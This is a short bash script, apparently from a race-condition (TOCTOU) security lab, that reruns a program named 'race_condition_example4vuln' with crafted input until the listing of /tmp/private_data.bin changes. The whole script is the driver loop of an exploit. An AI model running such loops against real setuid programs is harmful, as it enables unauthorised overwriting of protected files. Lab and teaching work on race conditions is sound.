#!/bin/bash

CHECK_CMD="ls -l /tmp/private_data.bin"
old_status=$($CHECK_CMD)
new_status=$($CHECK_CMD)

while [ "$old_status" == "$new_status" ]
do
	./race_condition_example4vuln < "bad_data"

	new_status=$($CHECK_CMD)
done

echo "ok!"
